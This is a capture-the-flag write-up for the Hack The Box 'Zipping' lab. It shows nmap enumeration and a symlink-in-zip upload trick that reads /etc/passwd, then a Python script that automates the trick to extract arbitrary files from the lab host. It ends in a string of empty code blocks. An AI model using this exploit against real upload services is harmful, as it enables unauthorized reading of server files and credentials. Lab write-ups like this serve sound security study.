![zipping.png](zipping.png)

# Zipping

## Enum

```bash
nmap -sC -sV -Pn 10.10.11.229 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 16:11 GMT
Nmap scan report for 10.10.11.229
Host is up (0.027s latency).
Not shown: 840 closed tcp ports (conn-refused), 158 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

```bash
curl -I http://10.10.11.229
HTTP/1.1 200 OK
Date: Sun, 29 Oct 2023 16:13:52 GMT
Server: Apache/2.4.54 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

There's an upload page which does only accept zip files with one pdf in it.  

## Arbitrary file read

Setup a file.pdf that is a symlink to /etc/passwd
```bash
ln -s /etc/passwd file.pdf
ls -la file.pdf
lrwxrwxrwx 1 blnkn blnkn 11 Oct 29 17:06 file.pdf -> /etc/passwd
```

Zip it, with the symlink as such instead of compressing and storing the file referred to by the link
```bash
zip --symlink -r file file.pdf
ls -la file.zip
-rw-r--r-- 1 blnkn blnkn 839 Oct 29 17:07 file.zip
```

Upload and curl the result
```bash
curl -s http://10.10.11.229/uploads/642147a874e4dbb4959086f0e6a9188d/file.pdf |grep sh$
root:x:0:0:root:/root:/bin/bash
rektsu:x:1001:1001::/home/rektsu:/bin/bash
```

## Automating the process

This is pretty much what the payload should look like according to burp
```bash
curl --X POST \
    -H 'Content-Type: multipart/form-data; boundary=---------------------------2882812691696788429152111510' \
    -b 'PHPSESSID=hbgid28hhen8m2b0648svpgg0u' \
    --data-binary \
'
-----------------------------2882812691696788429152111510
\x0d\x0a
Content-Disposition: form-data; name=\"zipFile\"; filename=\"file.zip\"\x0d\x0aContent-Type: application/zip\x0d\x0a\x0d\x0aPK\x03\x04\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x1c\x00file.pdfUT\x09\x00\x03K\xe3>eN\xe3>eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00/var/www/html/shop/cart.phpPK\x01\x02\x1e\x03\x0a\x00\x00\x00\x00\x00(\xb7]W\xdc.C\x92\x1b\x00\x00\x00\x1b\x00\x00\x00\x08\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xa1\x00\x00\x00\x00file.pdfUT\x05\x00\x03K\xe3>eux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00N\x00\x00\x00]\x00\x00\x00\x00\x00
\x0d\x0a
-----------------------------2882812691696788429152111510
\x0d\x0a
Content-Disposition: form-data; name=\"submit\"
\x0d\x0a
\x0d\x0a
\x0d\x0a
-----------------------------2882812691696788429152111510
--
\x0d\x0a
'

'http://10.10.11.229/upload.php'
```

After experimenting a little it looks like we can't really do this with requests, the name and filename need to be different, as far as I can tell requests doesn't provide that level of granularity.  

So I ended up borrowing a chunk of code form stack overflow to build the payload manually with htt.client
```python
import subprocess
import argparse
import http.client
import uuid
import requests
from bs4 import BeautifulSoup


def do_the_symlink(link_path, file_name):
    res = subprocess.run(
        [f"rm {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)

    res = subprocess.run(    # noqa F841
        [f"ln -s {link_path} {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)


def do_the_zip(file_name):
    res = subprocess.run(
        [f"rm {file_name}.zip"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)

    res = subprocess.run(    # noqa F841
        [f"zip --symlink -r {file_name}.zip {file_name}.pdf"],
        shell=True,
        capture_output=True,
        text=True
    )
    # print(res.stdout)
    # print(res.stderr)


def send_the_zip(file_name):

    # Prepare the file content
    file_path = f"{file_name}.zip"
    with open(file_path, "rb") as f:
        file_content = f.read()

    # Define the boundary
    boundary = str(uuid.uuid4())
    headers = {
        'Content-Type': f"multipart/form-data; boundary={boundary}",
    }

    # Create HTTP connection proxied through burp
    conn = http.client.HTTPConnection("127.0.0.1", port="8080")
    conn.set_tunnel(
      "10.10.11.229"
    )

    # Create multipart/form-data payload
    payload = \
        f"--{boundary}\r\n" \
        "Content-Disposition: form-data; name=\"zipFile\"; " \
        f"filename=\"{file_name}.zip\"\r\n" \
        "Content-Type: application/zip\r\n" \
        "\r\n".encode() + file_content + "\r\n" \
        f"--{boundary}\r\n" \
        "Content-Disposition: form-data; name=\"submit\"\r\n" \
        "\r\n" \
        "\r\n" \
        f"--{boundary}--\r\n".encode()

    # Send the request
    conn.request("POST", "/upload.php", body=payload, headers=headers)

    # Get the response
    response = conn.getresponse()
    data = response.read()

    # Close the connection
    conn.close()

    # Print response
    # print(response.status, response.reason)
    # print(data.decode("utf-8"))

    return data


def get_the_link(data):
    soup = BeautifulSoup(data.decode("utf-8"), features="html.parser")
    res = soup.find("section", {"id": "work"})
    link = res.div.a.text
    return f"http://10.10.11.229/{link}"


def get_the_file(link):
    data = requests.get(link)
    data.status_code
    file = data.text
    print(file)


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", help="Path of the file to extract")
    args = parser.parse_args()
    link_path = args.p
    file_name = "file"

    do_the_symlink(link_path, file_name)
    do_the_zip(file_name)
    response = send_the_zip(file_name)
    link = get_the_link(response)
    get_the_file(link)
```

```bash
python3 zipper.py -p /var/www/html/shop/cart.php > ../loot/cart.php
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```

